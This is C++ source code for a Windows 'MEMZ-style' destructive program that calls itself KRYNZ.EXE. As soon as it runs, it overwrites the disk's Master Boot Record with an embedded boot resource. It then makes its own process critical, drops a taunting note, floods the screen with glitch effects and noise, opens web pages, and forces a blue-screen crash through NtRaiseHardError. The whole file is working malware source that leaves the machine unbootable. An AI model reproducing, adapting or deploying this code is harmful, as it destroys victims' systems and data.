#include <Windows.h>
#include <stdlib.h>
#include <time.h>
#include <math.h>
#include <process.h>
#include "../resource.h"
#include <Windows.h>
#include "../resource1.h"

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "winmm.lib")

typedef NTSTATUS(NTAPI* pRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);

void SetCriticalProcess() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        CloseHandle(hToken);
    }


    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        auto RtlSetProcessIsCritical = (pRtlSetProcessIsCritical)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
        if (RtlSetProcessIsCritical) {
            RtlSetProcessIsCritical(TRUE, NULL, FALSE);
        }
    }
}

void overwriteMBR() {
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_BOOT1), L"boot");
    if (!hRes) return;

    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return;

    LPVOID pData = LockResource(hData);
    DWORD size = SizeofResource(NULL, hRes);

    HANDLE hDisk = CreateFile(
        L"\\\\.\\PhysicalDrive0",
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hDisk == INVALID_HANDLE_VALUE) return;

    DWORD written;
    WriteFile(hDisk, pData, size, &written, NULL);

    CloseHandle(hDisk);
}

void createNote() {
    const char* text =
        "YOUR SYSTEM HAS BEEN INFECTED BY THE KRYNZ.EXE\n\n"
        "I've always wanted to leave my digital fingerprint somewhere...\n"
        "\n\n"
        "DO NOT RESTART THE COMPUTER.\n"
        "ENJOY THE SHOW.";

    HANDLE hFile = CreateFile(L"note.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, text, strlen(text), &written, NULL);
        CloseHandle(hFile);

        ShellExecute(NULL, L"open", L"notepad.exe", L"note.txt", NULL, SW_SHOWNORMAL);
    }
}
struct MouseData {
    HDC hdc;
    HICON* icons;
};

void openWebsites() {

    ShellExecute(NULL, L"open", L"https://www.google.com/search?q=how+to+buy+a+new+computer", NULL, NULL, SW_SHOWNORMAL);
    Sleep(5600);

    ShellExecute(NULL, L"open", L"https://www.google.com/search?q=what+is+a+computer+virus", NULL, NULL, SW_SHOWNORMAL);
    Sleep(7800);

    ShellExecute(NULL, L"open", L"https://www.youtube.com/@alex.cybersecurity", NULL, NULL, SW_SHOWNORMAL);
    Sleep(6200);

};


void mouseThread(void* arg) {
    MouseData* data = (MouseData*)arg;
    while (true) {
        POINT p;
        GetCursorPos(&p);
        SetCursorPos(p.x + (rand() % 5 - 2), p.y + (rand() % 3 - 2));
        DrawIcon(data->hdc, p.x + (rand() % 40 - 20), p.y + (rand() % 40 - 20), data->icons[rand() % 4]);
        Sleep(10);
    }
}


void mousePhase(HDC hdc) {
    HICON icons[] = {
        LoadIcon(NULL, IDI_ERROR),
        LoadIcon(NULL, IDI_WARNING),
        LoadIcon(NULL, IDI_QUESTION),
        LoadIcon(NULL, IDI_INFORMATION)
    };

    DWORD start = GetTickCount();
    while (GetTickCount() - start < 5) {
        POINT p;
        GetCursorPos(&p);
        SetCursorPos(p.x + (rand() % 5 - 2), p.y + (rand() % 3 - 2));
        DrawIcon(hdc, p.x + (rand() % 40 - 20), p.y + (rand() % 40 - 20), icons[rand() % 4]);
        Sleep(10);
    }
}

void triggerBSOD() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;


    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tp.Privileges[0].Luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);

    // NtRaiseHardError
    typedef NTSTATUS(NTAPI* pNtRaiseHardError)(
        NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    auto NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");

    ULONG response;
    NtRaiseHardError(0xC0000350, 0, 0, NULL, 6, &response);
}

void soundThread(void* arg) {
    HWAVEOUT hWaveOut;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

    char buffer[11025];
    WAVEHDR header = { buffer, 11025, 0, 0, 0, 0, NULL, 0 };

    auto play = [&]() {
        waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
        };
    auto stop = [&]() {
        waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        };

    while (true) {
        int effect = rand() % 7;
        if (effect == 0) { // Click
            for (int i = 0; i < 11025; i++) {
                float t = (float)i / 11025.0f;
                buffer[i] = (char)(sin(t * 800) * exp(-t * 15) * 120 + 128);
            }
            play(); Sleep(200); stop();
        }
        else if (effect == 1) { // Screech
            for (int i = 0; i < 11025; i++) {
                float freq = 5000.0f - (i / 11025.0f) * 1800.0f;
                float t = (float)i / 11025.0f;
                buffer[i] = (char)(sin(t * freq) * 100 + (rand() % 50 - 10) + 128);
            }
            play(); Sleep(500); stop();
        }
        else if (effect == 2) {
            for (int i = 0; i < 11025; i++) {
                float amp = (float)i / 11025.0f;
                buffer[i] = (char)((rand() % 255 - 128) * amp + 128);
            }
            play(); Sleep(300); stop();
        }
        Sleep(rand() % 50 + 10);
    }
}

DWORD GetRandomROP() {
    DWORD rops[] = { SRCINVERT, SRCPAINT, SRCAND, 0x00220326, 0x00990066 };
    return rops[rand() % 5];
}

int main() {
    FreeConsole();
    SetProcessDPIAware();
    srand((unsigned int)time(NULL));

    overwriteMBR();

    PlaySound(MAKEINTRESOURCE(IDR_WAVE1), GetModuleHandle(NULL), SND_RESOURCE | SND_ASYNC);

    createNote();

    Sleep(13800);


    PlaySound(NULL, NULL, 0);

    MessageBox(NULL,
        L"A fatal error has occurred.\nSystem integrity compromised. Restart is required.",
        L"Kernel.dll Error",
        MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);

    HDC hdc = GetDC(NULL);
    HICON icons[] = {
        LoadIcon(NULL, IDI_ERROR),
        LoadIcon(NULL, IDI_WARNING),
        LoadIcon(NULL, IDI_QUESTION),
        LoadIcon(NULL, IDI_INFORMATION)
    };

    SetCriticalProcess();

    _beginthread(soundThread, 0, NULL);

    mousePhase(hdc);

    MouseData mouseData = { hdc, icons };
    _beginthread(mouseThread, 0, &mouseData);

    int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);

	openWebsites();

    int tunnelOffset = 0;
    DWORD startTime = GetTickCount();
    DWORD totalTime = 50000;

    while (true) {
        DWORD currentTime = GetTickCount();
        DWORD elapsed = currentTime - startTime;

        if (elapsed >= totalTime) {
            triggerBSOD();
        }


        if (rand() % 10 == 0) {
            BitBlt(hdc, x, y, w, h, hdc, x, y, DSTINVERT);
        }

        if (elapsed < 25000) {
            int glitchW = rand() % (w / 2) + 10;
            int glitchH = rand() % (h / 2) + 10;

            BitBlt(hdc,
                x + rand() % (w - glitchW),
                y + rand() % (h - glitchH),
                glitchW, glitchH, hdc,
                x + rand() % (w - glitchW),
                y + rand() % (h - glitchH),
                GetRandomROP());

            Sleep(5);
        }


        else {
            tunnelOffset += 1;
            StretchBlt(hdc,
                x + tunnelOffset, y + tunnelOffset,
                w - (tunnelOffset * 2), h - (tunnelOffset * 2),
                hdc, x, y, w, h, SRCCOPY);

            if (tunnelOffset > w / 2 - 25 || tunnelOffset > h / 2 - 25)
                tunnelOffset = 0;

            Sleep(2);
        }

        if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) exit(0);
    }

    ReleaseDC(NULL, hdc);
    return 0;
}